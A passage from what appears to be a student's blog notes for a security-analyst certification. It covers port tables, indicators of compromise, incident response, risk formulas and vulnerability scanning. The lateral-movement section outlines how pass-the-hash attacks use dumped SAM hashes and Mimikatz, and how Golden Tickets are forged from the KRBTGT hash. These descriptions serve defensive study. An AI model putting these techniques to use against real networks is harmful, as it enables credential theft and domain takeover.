| 53   | DNS      | Domain Name System uses TCP for zone transfers |
| 80   | HTTP     | HyperText Transfer Protocol |
| 110  | POP3     | Post Office Protocol is a legacy mailbox access protocol |
| 111  | RPCBIND  | Maps Remote Procedure Call (RPC) services to port numbers in a UNIX-like environment |
| 135  | MSRPC    | Advertises what RPC services are available in a Windows environment |
| 139  | NETBIOS-SSN | NetBIOS Session Service supports Windows File Sharing with pre-Windows 2000 version hosts |
| 143  | IMAP     | Internet Mail Access Protocol |
| 443  | HTTPS    | HyperText Transfer Protocol Secure |
| 445  | MICROSOFT-DS | Supports Windows File Sharing (Server Message Block over TCP/IP) on current Windows networks |
| 993  | IMAPS    | Internet Mail Access Protocol Secure |
| 995  | POP3S    | Post Office Protocol Secure |
| 1723 | PPTP     | Point-to-Point Tunneling Protocol is a legacy VPN protocol with weak security implementation |
| 3306 | MySQL    | MySQL database connection |
| 3389 | RDP      | Remote Desktop Protocol |
| 5900 | VNC      | Virtual Network Computing remote access service where security is implementation dependent and VNC may use other ports |
| 8080 | HTTP-PROXY | HTTP Proxy Service or alternate port for HTTP |

Here is a list of well known UDP ports and the protocols/applications they run: 

| Port Number | Protocol | Description |
| --- | --- | --- |
| 53 | DNS | Domain Name System uses UDP for DNS queries |
| 67 | DHCPS | Server port for the Dynamic Host Configuration Protocol (DHCP) |
| 68 | DHCPC | Client port for the Dynamic Host Configuration Protocol (DHCP) |
| 69 | TFTP | Trivial File Transfer Protocol |
| 123 | NTP | Network Time Protocol |
| 135 | MSRPC | Advertises what RPC services are available in a Windows environment |
| 137 | NETBIOS-NS | NetBIOS Name Service supports Windows File Sharing with pre-Windows 2000 version hosts |
| 138 | NETBIOS-DGM | NetBIOS Datagram Service supports Windows File Sharing with pre-Windows 2000 version hosts |
| 139 | NETBIOS-SSN | NetBIOS Session Service supports Windows File Sharing with pre-Windows 2000 version hosts |
| 161 | SNMP | Agent port for Simple Network Management Protocol |
| 162 | SNMP | Management station port for receiving SNMP trap messages |
| 445 | MICROSOFT-DS | Supports Windows File Sharing (Server Message Block over TCP/IP) on current Windows networks |
| 500 | ISAKMP | Internet Security Association and Key Management Protocol that is used to set up IPsec tunnels |
| 514 | SYSLOG | Server port for a syslog daemon |
| 520 | RIP | Routing Information Protocol |
| 631 | IPP | Internet Printing Protocol |
| 1434 | MS-SQL | Microsoft SQL Server |
| 1900 | UPNP | Universal Plug and Play is used for autoconfiguration of port forwarding by games consoles and other smart appliances |
| 4500 | NAT-T-IKE | Used to set up IPsec traversal through a Network Address Translation (NAT) gateway |

## Data exfiltration

Data exfiltration is the unauthorized transfer of data from a computer or network. This can be accomplished through a variety of methods such as email attachments, removable media, or uploading to cloud storage. Data exfiltration can also occur through a covert channel, such as steganography, or through a vulnerability in a system or application. Data exfiltration is often used by attackers to steal sensitive information, such as financial data or confidential business information, or to exfiltrate intellectual property.

A good way to mitigate data exfiltration is to encrypt the sensitive data at rest and in transit. 

## Covert Channels and Steganography

Covert channels are methods of communication that use a system's resources in ways that are not intended for communication, in order to exfiltrate sensitive information or bypass security controls. They can be classified into five types: storage, timing, bandwidth, power and side-channel covert channels. These channels can be difficult to detect and defend against as they use a system's resources in ways that are not visible to the system's security controls.

Steganography is the practice of hiding information within other seemingly innocent information. It is used to conceal the existence of a message or other data, making it less likely to be detected or intercepted. There are several methods of steganography including text, image, audio, video and network steganography. It can be used for both legitimate and malicious purposes, such as protecting the privacy of communication or exfiltrating sensitive information from a network. 

---

# Host-Related IOCs

In this section we wil analyze the Indicators of Compromise that may imply that a host is under attack. 

## Malicious Processes

A Malicious Process is any process executed without proper authorization from the system owner and with the purpose of damaging or compromising the system. 

In Windows systems, this code is usually injected into a host process my baking it load the code as it was a Dynamic Link Library (DLL). A DLL is a library file in Windows that contains code and data that can be shared by multiple programs, allowing them to use common resources and reduce the size of individual programs.
In Linux systems, it uses injection into shared libraries (Shared Object/**.so** files), similar to DLL in Windows. 

Some **abnormal behaviours** may indicate that the process is malicious or corrupted. There are tools that can help you monitor all the processes and create a baseline image of what should be the correct behaviour: 

For Windows you can use: 
- Process Monitor: A real-time system activity monitor for Windows that displays detailed information about processes, file and registry access, and network activity.
- Process Explorer: A tool that provides detailed information about running processes and their resources, including handles and DLLs, and allows users to view process relationships and system resource usage.
- tasklist: A command-line tool in Windows that displays a list of running processes and basic information about them.
- PE Explorer: A software tool that analyzes Portable Executable files, including executable files, DLLs, and ActiveX controls, and allows users to view the internal structure of a file.

For Linix you can use: 
- pstree: It provides relation with the parent/child processes of the system.
- ps: It shows processes started by the user by default, but you can use the **-A or -e** options to have the full list

## Memory Forensics

The **Fileless** malware doesn't store files and it executes from memory. To detect them, is important to use techniques that analyze the contents of the system memory and doesn't rely only on scanning the file system. FTK and EnCase (mentioned in previous chapters) have this memory analysis. 

There is also [The Volatility Framework](https://www.volatilityfoundation.org/contest), which is an open-source memory forensics tool that has different modules for diferent purposes, such as web beowser, command prompt history and others. 

## Consuption 

A huge increase in the resource consuption is a key indicator of malicious acitivity, however, it can cause false positives with legitimate software. 

Some key resources are the **Processor Usage**, which is the percentage of CPU time consumed by a single process, and **Memory Consumption**, which is the amount of memory that a single process is using. 

**top and free** comands can be used to analyze the consumption. **top** creates a scrollabe table of every process and the information is being constantly updated. **free** command outputs a summary of the used and available memory. 

## Disk and File System 

Is likely that the malware leaves metadata on the file system, so it is important to monitore it too. 

**Staging Areas** is the place in the system where the malware begins to collect data and prepare for the data exfiltration. Data is often encrypted and compressed in these staging areas, so supicious compressed files may indicate a possible staging area. 

There are several tools (**File System Viewers**) that allows the user to search within the file system for some specific files or words. 

The Windows **dir** command has some advanced functionality for file system analysis:
- dir /A*x*: /A*x* filters all file and folder types that match the given parameter x. x can take different values, such as H for hidden folders. For more inforation you can follow the dir [manual page](https://learn.microsoft.com/es-es/windows-server/administration/windows-commands/dir) 
- dir /Q: Displays who owns each file, along with standard information.
- dir /R: Displays alternate data streams for a file. 

> Alternate Data Streams (ADS) are a feature in Microsoft's NTFS file system that allows multiple, separate data streams to be associated with a single file, used to store metadata or related information. For example, an alternate data stream could be used to store information about the author of a file, or a thumbnail image of the file's content.
{: .prompt-info}

In Linux, we can use **lsof** to see all the filles that are currently open on the OS and all the resources that a process is currently using. 

## Unauthorized Privilege

Privilege Escalation (PE) is the process where the attacker tries to obtain higher privileges exploting flaws in the system or applications. In order to detect PE attempts, it's important to monitor: 
- Unauthorized sessions:  Occurs when certain accounts access devices or services that they should not be authorized to access
- Failed Log-ons: An attempt to authenticate to the system using the incorrect username/password combination or other credentials
-  New Accounts: An attacker may be able to create new accounts in a system and can be especially dangerous if they create an administrator account
- Guest Account Usage: Guest accounts can enable an attacker to log on to a domain and begin footprinting the network
- Off-hours Usage: An account being used in off hours

## Unauthorized Software 

Some attackers or malware may install additional software in the system. This additional software may be legitimate software, but is being used for a unauthorized purpose. 

That is why is important to define what software should be used in a workstation and deny the rest of it. However, attackers could modify existent files for malicious use. 

There are some concepts that can help us in windows to detect and control this situations. 

**Prefetch Files** are files that records the names of applications that have been run, as well as the date and time, file path, run count, and DLLs used by the executable.

The **Shimcache** records information about the execution of files and applications, such as the execution time, path, and file size. This information can be used by forensic investigators to determine what files and applications were executed on a Windows system and when. It is stored in the Registry as the key *HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache\AppCompatCach*.

Amcache, short for Application Compatibility Cache, is a database that stores information about applications and files that have been executed on a Windows system. The information stored in the Amcache includes the file path, size, creation and modification timestamps, and hash values. It is stored as a hive file at *C:\Windows\appcompat\Programs\Amcache.hve*.

## Unauthorized Change (Softare/Hardware)
Any change that has been made to a configuration file, software profile, or hardware without proper authorization or undergoing the change management process. This can occure with hardware too, for example the USB firmware can be reprogrammed to make the device look like another device class. 

## Persistence 

Persistence is the ability of a threat actor to maintain covert access to a target host. In Windows, persistance is often obtained modifying the Registry. 

This tools can help when analyzing the registry: 

- **regdump**: dumps the contents of the registry in a text file with simple formatting so that you can search specific strings in the file with find. 
- **Windows Task Scheduler**: Enables you to create new tasks that will run at predefined times. 
- **crontab**: Is the same as the Task Scheduler but for Linux. 

### Important Windows Registry keys

The **Run** and **RunOnce** keys are part of the Windows registry and are used to automatically launch programs or perform other actions when the system starts up. The Run key, located at HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run and HKEY\_CURRENT\_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run, specifies programs that should be automatically launched every time the system starts up. The entries in the Run key are executed in the order they appear, and the programs specified in this key continue to run in the background even after the user logs on.

The RunOnce key, located at HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce and HKEY\_CURRENT\_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce, specifies programs that should be automatically launched only once, the next time the system starts up. After the programs specified in the RunOnce key have been executed, the entries are deleted from the registry, and the programs will not be launched again the next time the system starts up.

> HKEY\_LOCAL\_MACHINE = HKLM and HKEY\_CURRENT\_USER = HKCU and HKEY\_CLASSES\_ROOT = HKCR
{: .prompt-info}

File extension registry entries associate a specific file extension with a particular program or application. These entries determine which program will be used to open a particular type of file, based on its extension. For example, if a file has a ".txt" extension, the file extension registry HKEY\_CLASSES\_ROOT.txt will determine which text editor should be used to open it.

If an attacer can modify theese registry keys, it could add a malicious program to be executed for a specific file extension. 

---

# Application IOCs

Anomalous activities/indicators that could be a indocator of compromised applications can be strange log entries, excessive ports used for a process, resurce consumptionand unusual user accounts. 

- **Unexpected Outbound Communication**
All the applications that require an outbound communication should be approved and inventoried. 

- **Unexpected Output**
Detect code injection by monitoring the database reads and examining HTTP response packet size or content. 


## Application Logs

It is important to configure your applications to log events. Some important logs that should be collected are: 

- **DNS Event Logs:** DNS server should log each time it handles a request along with the response given. 
- **HTTP Access Logs:** Whenever there is a HTTP error or a match with a predefined rule, it should be logged. 
- **SSH Access Log:** SSH connections should be disabled, but if necessary, all conection attempts should be logged. 
- **SQL Event Logs:** Record events like server startup, cache cleaning, database errors, etc. SQL servers can also log individual queries sent to the databases. 

## New Accounts 

A common way to maintain access or escalate privileges is to create new accounts. In a enterprise domain using Active Directory, the local users and groups that exist on each machine should be disabled and all the users shoud use an Active Directory account for a better control and monitoring. 

The creation of new accounts should be highly monitored and restricted. 

## Virtualization Forensics 

Virtualization provides security challenges when trying ot monitor logs, memory analysis etc. 
Process and memory analysis can be performed using VM Introspection. The goal of VMI is to allow the host to inspect the guest operating system and application data within a VM without affecting the guest's normal execution.

VMI provides a view into the virtualized environment that is similar to what a debugger would provide for a natively executed application. This makes VMI a useful tool for security, management, and debugging purposes. For example, VMI can be used to detect malware, monitor resource usage, or identify performance issues in virtualized environments.

VMI is implemented through a special driver that is installed on the host operating system. This driver communicates with the virtualization software to obtain information about the guest operating system and applications running inside the VM. The driver then provides this information to the VMI tool, which can display it to the user or analyze it further.

Logs from Virtual Machines should be configured to a remote logging server to prevent system logs from being lost when deprovisioning the Virtual Machine. 

## Mobile Devices

In order to perform logging in a Mobile, it is necessary to have a MDM (Mobile Device Management). When a MDM is installed on a phone, the mobile can be remotely controlled and wiped when considered necessary. 

This are a list of some software that can perform Mobile Forensics: 
- **Cellebrite:** Tool focused on evidence extraction from smartphones and other mobile devices, including older feature phones, and from cloud data and metadata using a universal forensic extraction device (UFED)

- **MPE+ and EnCase Portable** are also forensics tools used for mobile phone forensics

If a legal warrant allows it, you can request logs from the Carrier Provier (Internet Service Providers). 

---

## Lateral Movement and Pivoting IOCs

Lateral movement is a technique to progressively move through a network to search for the data/assets that the attacker is targetting. Pivoting is the use of a compromised machine to attack other systems of the network and permit the lateral movement. Pivoting and Lateral movement are similar but they are not the same. The main difference is that in Piviting techniques, a **compromised computer** is used to **attack another one** while in lateral movement, there is no need to **attack**. Port forwarding is a pivoting technique that can help to ypass firewalls. 

In this section we will discuss some common techniques. 

### Pass the Hash

This network-based attack is a type of credential theft attack where the attacker gain access to a system by using the hash value of a user's password rather than the actual password. 

Windows systems store chached credential hashes in the Windows Security Account Manager (SAM). This means that if an attacker gains access to a system with some type of privileged access, different tools can be used to extract the hashes stored in the SAM database. This hashes are used in some network protocols like SMB and Kerberos. 

1. Is required that the victim has already used the paswords on that system before the attack, since the hashes need to be in the SAM database.
2. The attacker gains access to the system and dumps the SAM database, obtaining password hashes. 
3. The attacker can use tools like Pass the Hash Toolkit or Mimikatz to create sessions with other systems using the hashes that have been just obtained. 

This attack doesn't require the attacker to know any password. If any hash obtained is from an admin account, the attacker can gain privileged access. 

> Mimikatz is a post-exploitation tool that attackers use to extract sensitive information from Windows systems, such as passwords and credentials. It exploits vulnerabilities in the Windows authentication system and extracts data from the LSASS process in memory.
{: .prompt-info}

This attack is difficult to detect and mitigate. However, some recomendations to avoid it are denying inbound traffic inside the network except frome specific systems that require inbound connections, restrict local accounts with adm privileges and use of antivirus to detect software like Mimikatz.

### Golden Ticket

In order to understand this attack, is important to understand the Kerberos authentication protocol. You can learn more about it here: [Active Directory (Kerberos)](https://adriapt.github.io/posts/active-directory/#kerberos)

A Golden Ticket is a type of Ticket-Granting ticket (TGT) forget by the attacker that can grant administrative access to other services on behalf of other members. In order to craft this Golden Ticket, the attacker needs the **KRBTGT** hash. 

The **KRBTGT** is a built-in account used in the Key Distribution Center (KDC) to encrypt and decrypt Kerberos tickets. The **KRBTGT** account is automatically created by Windows when a domain is set up, and it has a unique password that is known only to the KDC. When a user logs on to the domain, the KDC uses the **KRBTGT** account and its password hash to encrypt the TGT and send it to the user. The user can then present the TGT to other systems on the network to authenticate themselves without needing to provide their password again.

The **KRBTGT** hash is typically stored in the Windows Active Directory database on domain controllers. Specifically, the hash is stored in the **NTDS.dit** database file, which contains the Active Directory database and is located in the %SystemRoot%\NTDS folder on the domain controller. If an attacker is able to gain access to a domain controller and retreive the **KRBTGT** hash, he can craft the Golden Ticket. 

![Gloden Ticket Flow](golden-ticket-attack.jpg)

--- 

## Incident Response Preparation: Phases and Data Classification

NIST has an [Incident Handling Guide 800-61](https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-61r2.pdf) and we can find the Incident Response Phases defined there: 

1. Preparation: Hardening and writing procedures (and playbooks) for future incidents 
2. Detection & Analysis: Determine if an Incident has taken place and notify relevant stakeholders
3. Containment Eradication & Recovery: Limit the scope of the incident and eradicate the danger
4. Post-Incident Activity: Analyze what could have been done better for future incidents.   

> In the CompTIA studyguide, the phase number 3 is divided in two different phases: 
3.1 Containment: Limit the scope and the magnitude of the incident by securing data and limiting the impact to business. 
3.2 Erradication and Recovery: Remove the cause of the incident and bring the system back to secure state.
{: .prompt-warning}


![Incident Response Phases](IncidentResponsePhases.png)

The CSIRT team is the **Cyber Security Incident Response Team** that that will implement this procedure. 

When an Incident takes place, is important to have a **call list** with thferent contacts in hierarchy order for notification and escalation. Is also important to have a **Communication Plan** with **out-of-band communication** between two parties, in case the main network has been compromised and can't be used. 

When the incident has been confirmed, a Incident Form/Ticket has to be created containing the following information: 
- Date, time and location
- Reporter and Incident Handler names
- How the incident was detected/observed
- Type of incident
- Scope of incident
- Description and event logging

The Incident Response will require the coordination between different departments such as **Senior Executives** responsible of the business operations, **Regulatory Bodies** like governmental organizations, **Legal counsel and law enforcement teams**, **Human Resources** and **Public Relations**. 
## Data Criticality 

Is important to classify the data in different categories. If there is a data breach, data classified as private or confidential will take priority over other incidents. Data can be classified as:

- **Personally Identifiable Information (PII):** Data that can be used to identify, contact or impersonate an individual  
- **Sensitive Personal Information (SPI):** Information about subject's opinions, beliefs (religious, political, gender, sexual orioentation, racial, health information...)
- **Personal Health Information (PHI):** Information that identifies someone as the subject of medical records, insurance, hospital results, laboratory tests, etc. 
- **Financial Information:** Data stored about bank accounts, investment accounts, payroll, tax, credit card data, etc. **PCI DSS** (Payment Card Industry Data Security Standard) defines the safe handling and storage of payment card data. 
- **Intellectual Property:** Information created by an organization about the products or services that they provide.
- **Corporate Information:** Confidential data owned by a company like product, sales, marketing, legal, cash flow, salaries, contract information, etc.

Any system that proces critical data to a mission or essenctial function of the company will be classified as a **High Value Asset**. The mantainment, confidentiality, integrity and availability of a high value asset has to be a priority. 

## Reporting Requirements 

When an incident has been identified, is required by legislation/regulation  to notificate the affected parties. There are different types of breaches. 

- **Data Exfiltration:** An attacker breaks into the system and transfers data to another system
- **Insider Data Exfiltration:** An employee or ex-employee with privileges on the system transfers data to another system.
- **Device Theft/Loss** A device, such as a smartphone or laptop, containing data is lost or stolen. 
- **Accidental Data Breach:** Public disclosure of information or unauthorized transfer caused by human error or a misconfiguration.
- **Integrity/Availability Breach:** Corruption of data or destruction of a system processing data.

> GDPR regulation requires nitification within 72h of becoming aware of the breach of personal data. 
{: .prompt-info}

# Detection and Containment

## OODA Loop

The OODA loop is a decision-making framework that stands for Observe, Orient, Decide, Act. It is a cyclic process that helps individuals and organizations make quick and effective decisions in dynamic environments by gathering information, analyzing it, making a decision, and taking action.

- **Observe:** Identify the problem or threat and gain an overall understanding of the internal and external environment.
- **Orient:** Involves reflecting on what has been found during observations and considering what should be done next.
- **Decide:** Makes suggestions towards an action or response plan while taking into consideration all of the potential outcomes.
- **Act:** Carry out the decision and related changes that need to be made in response to the decision. 

By cycling through these steps, you can adapt to changing circumstances and make decisions that are both effective and efficient.


## Detection and Analysis

Detection is the capacity to determine if an incident has taken place. Most organitzations use SIEM as a central tool to use for the incident detection and analysis phase. The SIEM must have defined different IOC that will allow the automatic detection and classification of the incident. 

Incidents should be classified as benign, suspicious or malicious. 

## Impact Analysis and Incident Classification

When an incident takes place, after it's detection, is necessary to do an impact analysis. This analysis should considere different things such as damage to data integrity, unauthorized changes, dataloss, disclousure of confidential data, service interruption and downtime. 

## Containment 

Doing a rapid containment action is importent when doing an incident response: 
- Ensure the safety and security of all personnel
- Prevent an ongoing intrusion or data breach
- Identify if the intrusion is the primary or secondary attack
- Avoid alerting the attacker that the attack has been discovered
- Preserve any forensic evidence of the intrusion and attack

**Isolation** is a strategy where the affected component is removed from the environment it is part of. It is the least stealthy option and it will reduce the opportunities to analyze the attack. **Segmentation** is when the network is divided in different parts  (Using VLANS, subnets and ACLs) and comunication between the different logical parts is limited and controled. 

---

# Eradication, Recovery and Post-Incident Actions

## Eradication and Recovery

Eradication is the step where the cause of the incident is removed and the recovery phase is when the system is set back to a secure state. The simplest option for eradicating a contaminated system is to replace it with a clean image from a trusted store. 

There are different ways to erase/sanitize a  device: 
- **Cryptographic Erase (CE):** Self encrypting devices have a encryption key. The CE method consists on deleting the key so the drive can't be decrypted. 
- **Zero-fill:** This method consists on averwriting all bits on a drive with the zero value. It is a slow method and no reliable with SSD and hybrid drives. 
- **Secure Erase (SE):** Secure erase is a method to sanitize a SSD by using manufacturer pdovided software. 
- **Secure Disposal:** This method consists on physicaly destroying the media. 

After de sanitazion has taken place, the drive can be **Reconstructed** using installation routines and templates or **Reimaged** using backups. If is not possible to sanitize the drive, it should be **Reconstituied**, a method of restoring a system by manual removing and monitoring. 

## Recovering Actions

- Patching: Installing a set of changes to a computer program or its supporting data designed to update, to fix, or to improve it. 
- Review Permissions
- Ensure that propper events are being Logged
- System hardening: The process of securing a system's configuration and settings to reduce IT vulnerability and the possibility of being compromised. Some hardening actions are: 
	- Deactivate unnecessary components
	- Disable unused user accounts
	- Implement patch management
	- Restrict host access to peripherals
	- Restrict shell commands

## Post-Incident Activities

Once the attack has been neutralized and the system is restored to secure operation, some activities should be done: 

- **Report Writing:** Create a Report to communicate information about the incident to the intended audience.
- **Incident Summary Report:** Incident summary reports contain information about how the incident occurred, how it could be prevented in the future, the impact and damage on the systems, and any lessons learned.
- **Evidence Retention:** The preservation of evidence based upon the required time period defined by regulations if there is a legal or regulatory impact caused by an incident.
- **Lessons Learned:** An analysis of events that can provide insight into how to improve response processes in the future wondering: Who was the adversary, why was the incident conducted, when did it occur, where did it occur, how did it occur and what could have mitigated it. 

After this actions, using the lessons learned the Incident Response Plan can be updated and new IOC can be generated and monitored. 

--- 

# Risk Mitigation 

## Enterprise Risk Management (ERM)

ERM is the process of evaluating, measuring amd mitigating risks that prevade within a organization. 

This schema defines the Risk Management Process defined by NIST. 

- Assess: Identifying and analyzing potential risks to the organization, including emerging risks that may not have been previously considered. The goal is to evaluate the likelihood and potential impact of each risk, as well as any interdependencies between risks.

- Frame: Developing a risk management strategy that is aligned with the organization's objectives and risk tolerance. The strategy should include specific actions to address each identified risk, including mitigation, transfer, avoidance, or acceptance.

- Monitor: Monitoring the effectiveness of the risk management strategy and adjusting it as needed based on changes in the risk landscape or the organization's objectives.

- Respond: Take action to implement the risk management strategy and respond to emerging risks as they arise. The response should be timely, effective, and consistent with the organization's objectives and risk tolerance.

![Risk Management Process](Risk-Management-Process.png)

## Conducting an Assessment 

Assets are valued according to the cost created by their loss or damage: 

- **Business Coninuity Loss:** A loss associated with no longer being able to fulfill contracts due to the breakdown of critical systems. 
- **Legal Costs:** A loss created by not being able to keep legal liability. 
- **Reputational Harm:** A loss created by negative publicity and consequential loss of market position. 


System Assessments are conducted to reduce risks and prevent losses. It consists on the identification of critical systems in a inventory along with the processes and tangible/intangible assets and resources that support those processes. 

**Mission Essential Function (MEF):**
An organitzation has to identify the activity that is too critical to be stopped for anything more than a few hours or less. 

Everything that is part of this MEF should be perfectly Inventiroed, and Threat and Vulnerability assessed. 

## Risk Calculation
### Quantitative Method 

Risk is calculated using this formula: 

$$ Risk = Likelihood x Impact $$

**Likelihood** is expressed as a percentage and **Impact** as a monetary value. 

The **Impact** can be obtained in several ways. A Single Loss Expectany (**SLE**) is the value for a single occurrence or loss and is expressed liek this: 
$$ SLE = AV x EF $$

Where **AV** is the Asset Value and **EF** is the exposure factor. 

If we want to obtain the Annual Loss Expectancy (**ALE**), we can use the SLE and the Annual Rate of Occurrence (**ARO**) of the incident and express the **ALE** as: 

$$ ALE = SLE x ARO $$

### Qualitative Method 

This risk analysis method uses opinions and reasoning to measure likelihood and impact of risk. 

### Semi-Quantitative 
This method uses a mixt of concrete values with opinions and reasoning because some things like employee morale or company reputation are difficult to have a exact monetary value. 

## Business Impact Analysis (BIA)

A Business Impact Analysis (BIA) is a process used by organizations to identify the potential impact of a disruption to their business operations. 

It contains metrics that express system availability: 

- **Maximum Tolerable Downtime (MTD):** The longest time a business can be inpoerable without causing irrevocable business failure, related with the MEF of the organization.
- **Recovery Time Objective (RTO):** The length of time it takes after an event to resume normal business operations and activities
- **Work Recovery Time (WRT):** The length of time in addition to the RTO of individual systems to perform reintegration and testing of a restored or upgraded system following an event
- **Recovery Point Objective (RPO):** The longest period of time that an organization can tolerate lost data being unrecoverable

**MTD** and **RPO** can help identify the MEF assets. 

## Risk Prioritization

When having to deal with a Risk, there are several actions that can be done: 

- **Risk Mitigation:** This response reduces the risk to fit within the organitzations risk appetite or deletes de risk. It can make the risk less likely or less costly

- **Risk Avoidance:** This response implies ceasing the activity that implies the risk and search for an alternative. 
- **Risk Transference:** Involves moving or sharing the responsability of the risk to another entity. 
- **Risk Acceptance:** A response that involves determining if the risk is within the organitzation's tisk appetite and assume the risk. 

The **Return on Security Investment (ROSI)** is a metric to calculate whether a security control is worth the cost of deploying and maintaining it. 

$$ ROSI = ((ALE - ALEm) - C) / C $$
**ALEm** is the Anual Loss Expectency with the applied control and **C** is the cost of aplying the control. 

---

# Frameworks, Policies and Procedures

A framework provides a set of Policies, checklist, activities and tecnologies to secure a business. It could also provide an externally verifable satement of regulatory compliance. 

Enterprise Security Architecture (**ESA**) refers to the process of designing and implementing a security framework to protect an organization's IT assets and data. It involves the development of policies, procedures, and controls to ensure that IT systems are secure and that sensitive data is protected from unauthorized access or disclosure.

## Prescriptive Frameworks

A prescriptive framework is a set of guidelines or recommendations that provide a clear and structured approach to a specific task, problem, or situation. It outlines a series of steps, processes, and best practices that are intended to help individuals or organizations achieve a desired outcome.

The **Maturity Model** of an **ESA** framework is used to assess the formality and optimization of security control selection and usage and address any gaps. It reviews the organitzation against expected goals and determine the level of risk. 

The ESA maturity model typically consists of five levels:

1. **Initial:** At this level, the organization has not yet started implementing a service-oriented architecture. IT systems are typically siloed, and there is little or no reuse of services across different applications.

2. **Managed:** At this level, the organization has started to implement controls, but it is still in the early stages. Services are being developed and reused, but there is no formal governance framework in place.

3. **Defined:** At this level, the organization has established a formal governance framework. This includes standards and policies for service development, testing, and deployment.

4. **Quantitatively Managed:** At this level, the organization has established a metrics-based approach. This includes monitoring and measuring service quality and performance, and using this data to continuously improve the architecture.

5. **Optimized:** At this level, the organization has fully integrated security controlls into its overall IT strategy. The architecture is highly flexible, agile, and adaptable to changing business needs.

![Maturity Model](maturitymodel.png)

## Risk-based Frameworks

A framework that uses risk assessment to prioritize security control selection and investment.

An example of this is the **NIST Cybersecurity Framework**, that is focused on IT security over IT service provision. It identifies five cybersecurity functions: Identify, Protect, Detect, Respond and Recover. There are different Implemenation Tiers that assess how closely core functions are integrated with the organization's overall risk management process and each tier is classed as Partial, Risk Informed, Repeatable, and Adaptive.

## Audits and Assessments

- **Quality Control (QC):** is the process of determining whether a system is free from defects.

- **Quality Assurence (QA):** is the process of analyzing what constitutes quality and how it can be measured and checked. 

An **assessment** is the process of testing the subject using a requirements checklist against a absolute standard. **Evaluation** is a less methodical process and more likely to depend on the judgement of the evaluator. However, an **Audit** is a more rigid process where the auditor (that can be external or internal), compares the organization against a predefined baseline to identify areas that require remediation. 

--- 

# Enumeration Tools 

Instead of talking about Active and Passive information gathering tools, you can find a more detailed explanation in these other posts that I made when studying for the OSCP: 

[Active Information Gathering](https://adriapt.github.io/posts/OSCP-7/)

[Passive Information Gathering](https://adriapt.github.io/posts/OSCP-6/)

--- 

# Vulnerability Scanning

It is important to do vulnerability assessments periodaicaly to a set of targets. These assessments are typically done by automated tools. 

The workflow the assessment should be: 
1. Install the software and prepare a baseline in order to identify deviations. Define the scope of the scan.
2. Perform an initial scan.
3. Analyze the results based on the baseline. 
4. Perform corrective actions. 
5. Perform another vulnerability scan to and ensure that the findings that were identified in the first scan are no longer there.
6. Document the findings and create reports. 
7. Repeat this porcess in a defined period.

When defining the scope of the scanning, it is not only about the assets that will be scanned, but also if it will be an **Internal or External** Scanning. An internal scanning is a when the scan is conducted on the local network wereas an external one is when the scan is launched from an external network to provide an attacker's prespecticve.  

## Scanner Types

A scan can be performer in several ways: 
- **Passive Scanning:** A passive scan only intercepts trafic and does not send packets to the assets. Is the less intrusive and likely to be detected but is the least effective. 
- **Active Scanning:** In this type of scann, probes are sent to the asset in order to analyze the responses and detect vulnerabilities. Active Scans can be Credential or Non-Credential: 
	- Credential: You configure the scanning tool to contain some credentials in order to log-on to the target system. They are more likely to find vulnerabilities. 
	- Non-Credential: The scanner doesn't have any passwords to log-on, so it tries default passwords. They are less likely to succeed.
	
- **Server-based Scanning:** The scanning is launched from one (or more) scanning servers that centralize the activity. 
- **Agent-based Scanning:** The scanning is performed in each target because the software is installed locally. This "agents" that run on each target are managed by a centralized server that collects the results. This type of scanns have less impact on the network.  

When performing scnans, is important to configure several parameters and the network. An exception in the Firewalls/IDS/IPS should be created to allow the scanner flux and not generate alarms. 

## Vulnerability Feeds

A vulnerability feed is a synchronized list of data and scripts used to check for vulnerabilities, also known as plug-ins or network vulnerability tests (NVTs). Most commercial vulnerability scanners require an ongoing paid subscription. 

Another important protocol is the **Security Content Automation Protocol (SCAP)**. SCAP is a framework of open standards that allows for the automation of security-related tasks, such as vulnerability scanning, compliance checking, and reporting. It defines a set of specifications for expressing and manipulating security-related information in a standardized manner, allowing for the automation of security-related tasks.

SCAP components include the following:

- **Common Vulnerabilities and Exposures (CVE)** - a dictionary of publicly known cybersecurity vulnerabilities and exposures.

- **Common Vulnerability Scoring System (CVSS)** - a method for assessing the severity of vulnerabilities.

- **Extensible Configuration Checklist Description Format (XCCDF)** - a standard format for specifying security checklists for automated compliance checking.

- **Open Vulnerability and Assessment Language (OVAL)** - a standard format for representing system configurations, vulnerabilities, and patches.

- **Common Platform Enumeration (CPE)** - a standardized method for identifying software applications and operating systems.

## Scan Reports

Indepently of the scann tool used, is important that all of them represent the same vulnerabilities in a consistent way. That's why there are common identifiers (some of them just mentioned above) that establish a unique way to represent things. 

- **Common Vulnerabilities and Exposures (CVE):** A commonly used scheme for identifying vulnerabilities developed by MITRE and adopted by NIST. Each vulnerability has an identifier that is in the format of CVE-YYYY-####. You can find all the CVE that are public [here](https://nvd.nist.gov/vuln/full-listing)

- **National Vulnerability Database (NVD):** A superset of the CVE database, maintained by NIST, that contains additional information such as analysis, criticality metrics (CVSS), and fix information or instructions.

- **Common Attack Pattern Enumeration and Classification (CAPEC):** A knowledge base maintained by MITRE that classifies specific attack patterns focused on application security and exploit techniques. ATT&CK is a tool for understanding adversary behaviors within a network intrusion event. 

- **Common Platform Enumeration (CPE):** Scheme for identifying hardware devices, operating systems, and applications:
```
cpe:/{part}:{vendor}: {product}:{version}: {update}:{edition}:{language}
```
- **Common Configuration Enumeration (CCE):** Scheme for provisioning secure configuration checks across multiple sources, CCE is a collection of configuration best-practice statements. 

## Common Vulnerability Scoring System (CVSS)

This approach quantifies vulnerability data and can be usefull when prioritizing response actions. 

| CVSS Score | Severity | Description |
|-----------|----------|-------------|
| 0.0       | None     | No impact on security. |
| 0.1 - 3.9 | Low      | Minor impact on security. |
| 4.0 - 6.9 | Medium   | Significant impact on security. |
| 7.0 - 8.9 | High     | Serious impact on security. |
| 9.0 - 10.0| Critical | Critical impact on security. |

The Common Vulnerability Scoring System (CVSS) score is calculated using a formula that takes into account various factors that contribute to the severity of a vulnerability. The CVSS score is based on three metric groups: Base, Temporal, and Environmental:

1. **Base metrics:** These metrics are characteristics of the vulnerability itself and do not change over time or based on the environment in which the vulnerability is present. They include the following:
